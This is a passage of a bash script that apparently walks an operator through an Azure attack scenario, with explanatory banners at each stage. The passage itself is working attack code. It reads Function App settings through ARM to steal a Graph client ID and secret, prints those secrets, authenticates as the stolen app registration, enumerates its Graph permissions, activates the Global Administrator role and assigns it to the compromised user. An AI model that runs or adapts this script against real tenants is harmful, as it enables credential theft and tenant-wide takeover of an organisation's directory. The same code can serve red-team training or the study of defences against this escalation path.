if [ -z "$APP_NAME" ] || [ "$APP_NAME" = "null" ]; then
  err "Function App name not found — cannot continue"
  exit 1
fi

spin_start "ARM: POST appsettings/list for $APP_NAME"

SETTINGS_JSON_RAW="$(curl -sS \
  -X POST \
  -H "Authorization: Bearer $ARM_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "$ARM_API${ELIG_SCOPE}/providers/Microsoft.Web/sites/${APP_NAME}/config/appsettings/list?api-version=2022-03-01" \
  -d '{}')"

spin_stop

# Validate JSON
if ! echo "$SETTINGS_JSON_RAW" | jq . >/dev/null 2>&1; then
  err "App settings response is not valid JSON"
  printf "%s[DEBUG]%s Raw response below:\n" "$YELLOW" "$RESET"
  echo "$SETTINGS_JSON_RAW"
  exit 1
fi

SETTINGS_JSON="$SETTINGS_JSON_RAW"

if echo "$SETTINGS_JSON" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to read application settings"
  echo "$SETTINGS_JSON" | jq .
  exit 1
fi

ok "Application settings retrieved"

#############################################
# 6.4 Extract sensitive values
#############################################
CLIENT_ID="$(echo "$SETTINGS_JSON" | jq -r '.properties["GRAPH_CLIENT_ID"] // empty')"
CLIENT_SECRET="$(echo "$SETTINGS_JSON" | jq -r '.properties["GRAPH_CLIENT_SECRET"] // empty')"
TENANT_ID_FOUND="$(echo "$SETTINGS_JSON" | jq -r '.properties["GRAPH_TENANT_ID"] // empty')"

printf "\n%s[+] %sExtracted secrets from Function App %s%s%s:\n" "$GREEN" "$RESET" "$CYAN" "$APP_NAME" "$RESET"

if [ -n "$CLIENT_ID" ]; then
  printf "  • GRAPH_CLIENT_ID     : %s%s%s\n" "$MAGENTA" "$CLIENT_ID" "$RESET"
else
  printf "  • GRAPH_CLIENT_ID     : %s<not found>%s\n" "$RED" "$RESET"
fi

if [ -n "$CLIENT_SECRET" ]; then
  printf "  • GRAPH_CLIENT_SECRET : %s%s%s\n" "$MAGENTA" "$CLIENT_SECRET" "$RESET"
else
  printf "  • GRAPH_CLIENT_SECRET : %s<not found>%s\n" "$RED" "$RESET"
fi

if [ -n "$TENANT_ID_FOUND" ]; then
  printf "  • GRAPH_TENANT_ID     : %s%s%s\n" "$MAGENTA" "$TENANT_ID_FOUND" "$RESET"
fi


#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"

printf "With Contributor access to the resource group, the attacker can enumerate\n"
printf "existing cloud resources without creating new ones.\n\n"

printf "Azure Function Apps commonly store secrets in application settings.\n"
printf "These values are retrievable via ARM by any principal with write access\n"
printf "to the resource group.\n\n"

printf "In this scenario, we successfully extracted:\n"
printf "  • An Azure AD Application (Client ID)\n"
printf "  • Its corresponding Client Secret\n\n"

printf "These credentials allow direct authentication to Microsoft Graph or Azure\n"
printf "Resource Manager as the application, enabling further lateral movement\n"
printf "or persistence without using the compromised user account.\n\n"

read -r -p "Step 6 is completed. Press Enter to finish the scenario..." _ || true

################################################################################
# Step 7. App-only auth (stolen creds) + permission discovery + proof output
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. App pivot (client_credentials) & privilege analysis  ===" "${RESET}"

#############################################
# 7.1 Authenticate to Microsoft Graph as the app (client_credentials)
#############################################
step "Authenticating to Microsoft Graph as stolen App Registration (client_credentials)"

if [ -z "${CLIENT_ID:-}" ] || [ -z "${CLIENT_SECRET:-}" ] || [ -z "${TENANT_ID_FOUND:-}" ]; then
  err "Missing CLIENT_ID / CLIENT_SECRET / TENANT_ID_FOUND from Step 6"
  exit 1
fi

spin_start "OAuth2 token request (app-only)"

APP_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "client_id=${CLIENT_ID}" \
  --data-urlencode "client_secret=${CLIENT_SECRET}" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://graph.microsoft.com/.default" \
  "https://login.microsoftonline.com/${TENANT_ID_FOUND}/oauth2/v2.0/token")"

spin_stop

APP_ACCESS_TOKEN="$(echo "$APP_TOKEN_RESP" | jq -r '.access_token // empty')"

if [ -z "$APP_ACCESS_TOKEN" ]; then
  err "Failed to obtain app-only Graph token"
  echo "$APP_TOKEN_RESP" | jq .
  exit 1
fi

ok "App-only Graph token acquired"

APP_AUTHZ_HEADER=(-H "Authorization: Bearer $APP_ACCESS_TOKEN")

#############################################
# 7.2 Identify which App Registration / Service Principal these creds belong to
#############################################
step "Resolving Service Principal (displayName) for stolen Client ID"

if [ -z "$CLIENT_ID" ]; then
  err "CLIENT_ID is empty — check extraction from Step 6"
  exit 1
fi

SP_JSON="$(curl -sS "${APP_AUTHZ_HEADER[@]}" \
  --get \
  --data-urlencode "\$filter=appId eq '${CLIENT_ID}'" \
  --data-urlencode "\$select=id,appId,displayName" \
  "https://graph.microsoft.com/v1.0/servicePrincipals")"

SP_ID="$(echo "$SP_JSON" | jq -r '.value[0].id // empty')"
SP_NAME="$(echo "$SP_JSON" | jq -r '.value[0].displayName // empty')"

if [ -z "$SP_ID" ]; then
  err "Failed to resolve service principal for appId=$CLIENT_ID"
  echo "$SP_JSON" | jq .
  exit 1
fi

ok "Stolen creds belong to Service Principal"
printf "  • DisplayName : %s%s%s\n" "$YELLOW" "$SP_NAME" "$RESET"
printf "  • AppId       : %s%s%s\n" "$YELLOW" "$CLIENT_ID" "$RESET"
printf "  • SP ObjectId : %s%s%s\n" "$YELLOW" "$SP_ID" "$RESET"


#############################################
# 7.3 Enumerate Microsoft Graph application permissions (app roles) granted to this SP
#############################################
step "Enumerating Microsoft Graph application permissions granted to this Service Principal"

spin_start "Graph: GET /servicePrincipals/{spId}/appRoleAssignments (resource=Graph)"

GRAPH_SP_ID="$(curl -sS "${APP_AUTHZ_HEADER[@]}" \
  --get \
  --data-urlencode "\$filter=appId eq '00000003-0000-0000-c000-000000000000'" \
  --data-urlencode "\$select=id" \
  "https://graph.microsoft.com/v1.0/servicePrincipals" \
  | jq -r '.value[0].id // empty')"
spin_stop

if [ -z "$GRAPH_SP_ID" ]; then
  err "Failed to resolve Microsoft Graph service principal ID"
  exit 1
fi

APP_ROLE_ASSIGNMENTS="$(curl -sS "${APP_AUTHZ_HEADER[@]}" \
  --get \
  --data-urlencode "\$filter=resourceId eq ${GRAPH_SP_ID}" \
  --data-urlencode "\$select=appRoleId,resourceId" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_ID}/appRoleAssignments")"

if ! echo "$APP_ROLE_ASSIGNMENTS" | jq -e '.value' >/dev/null 2>&1; then
  err "Invalid appRoleAssignments response"
  echo "$APP_ROLE_ASSIGNMENTS" | jq .
  exit 1
fi

ASSIGN_COUNT="$(echo "$APP_ROLE_ASSIGNMENTS" | jq '.value | length // 0')"
if [ "$ASSIGN_COUNT" -eq 0 ]; then
  err "No Microsoft Graph app permissions found on this Service Principal"
  exit 1
fi

ok "Found $ASSIGN_COUNT Microsoft Graph app permission(s)"

# Build a lookup table from Graph SP appRoles: appRoleId -> value (permission name)
GRAPH_APPROLES="$(curl -sS "${APP_AUTHZ_HEADER[@]}" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${GRAPH_SP_ID}?\$select=appRoles")"

# Print permissions by mapping assigned appRoleId to appRoles[].value
PERMS="$(echo "$APP_ROLE_ASSIGNMENTS" | jq -r '.value[].appRoleId')"
FOUND_RM_RWD="0"

while read -r rid; do
  [ -z "$rid" ] && continue
  PERM_NAME="$(echo "$GRAPH_APPROLES" | jq -r --arg RID "$rid" '
    .appRoles[] | select(.id==$RID) | .value
  ' | head -n1)"

  if [ -z "$PERM_NAME" ] || [ "$PERM_NAME" = "null" ]; then
    PERM_NAME="UnknownPermission($rid)"
  fi

  printf "  • %s%s%s\n" "$CYAN" "$PERM_NAME" "$RESET"

  if [ "$PERM_NAME" = "RoleManagement.ReadWrite.Directory" ]; then
    FOUND_RM_RWD="1"
  fi
done <<< "$PERMS"

#############################################
# 7.4 Operator explanation (short)
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We pivoted from the compromised user into an App Registration using stolen client credentials.\n"
printf "We resolved the Service Principal name and enumerated its Microsoft Graph application permissions.\n\n"
printf "If the app has %sRoleManagement.ReadWrite.Directory%s, it can manipulate directory role assignments\n" "$MAGENTA" "$RESET"
printf "via Microsoft Graph. This is a common path to tenant-wide privilege escalation (e.g., Global Admin).\n\n"

read -r -p "Press Enter to complete the escalation..." _ || true

#############################################
# 7.5 Privilage escalation
#############################################

GA_ROLE_JSON="$(curl -sS "${APP_AUTHZ_HEADER[@]}" \
  "https://graph.microsoft.com/v1.0/directoryRoles")"

GA_ROLE_ID="$(echo "$GA_ROLE_JSON" | jq -r '
  .value[]
  | select(.roleTemplateId=="62e90394-69f5-4237-9190-012177145e10")
  | .id
')"

if [ -z "$GA_ROLE_ID" ]; then
  step "Activating Global Administrator directory role"

  ACTIVATE_RESP="$(curl -sS -X POST "${APP_AUTHZ_HEADER[@]}" \
    -H "Content-Type: application/json" \
    "https://graph.microsoft.com/v1.0/directoryRoles" \
    -d '{
      "roleTemplateId": "62e90394-69f5-4237-9190-012177145e10"
    }')"

  GA_ROLE_ID="$(echo "$ACTIVATE_RESP" | jq -r '.id')"
fi

step "Assigning Global Administrator to compromised user"

HTTP_CODE="$(curl -sS -o /tmp/ga_assign.json -w "%{http_code}" \
  -X POST "${APP_AUTHZ_HEADER[@]}" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/directoryRoles/${GA_ROLE_ID}/members/\$ref" \
  -d "{
    \"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/${USER_OID}\"
  }")"

if [ "$HTTP_CODE" = "204" ]; then
  ok "Global Administrator role assigned to user"
else
  err "Failed to assign Global Admin (HTTP $HTTP_CODE)"
  cat /tmp/ga_assign.json | jq . || cat /tmp/ga_assign.json
  exit 1
fi

spin_start "Waiting role gets assigned"
sleep 15
spin_stop

#############################################
# 7.6 — Validate role assignment (victim identity)
#############################################

USER_JSON="$(curl -sS "${APP_AUTHZ_HEADER[@]}" \
  "https://graph.microsoft.com/v1.0/users/${USER_OID}?\$select=displayName,userPrincipalName")"

USER_NAME="$(echo "$USER_JSON" | jq -r '.displayName // "UnknownUser"')"
USER_UPN="$(echo "$USER_JSON" | jq -r '.userPrincipalName // "unknown@tenant"')"

ROLE_ASSIGNMENTS_JSON="$(curl -sS "${APP_AUTHZ_HEADER[@]}" \
  --get \
  --data-urlencode "\$filter=principalId eq '${USER_OID}'" \
  "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments")"

ROLE_COUNT="$(echo "$ROLE_ASSIGNMENTS_JSON" | jq '.value | length')"

ok "User \"$USER_NAME\" now has $ROLE_COUNT directory role assignment(s)"

for rd in $(echo "$ROLE_ASSIGNMENTS_JSON" | jq -r '.value[].roleDefinitionId'); do
  ROLE_NAME="$(curl -sS "${APP_AUTHZ_HEADER[@]}" \
    "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/${rd}" \
    | jq -r '.displayName')"

  printf "  • %s%s%s\n" "$CYAN" "$ROLE_NAME" "$RESET"
done

if echo "$ROLE_ASSIGNMENTS_JSON" | jq -r '.value[].roleDefinitionId' \
  | grep -qi "62e90394-69f5-4237-9190-012177145e10"; then
  ok "CONFIRMED — $YELLOW$USER_NAME$RESET is Global Administrator"
else
  err "Global Administrator not detected for $USER_UPN"
fi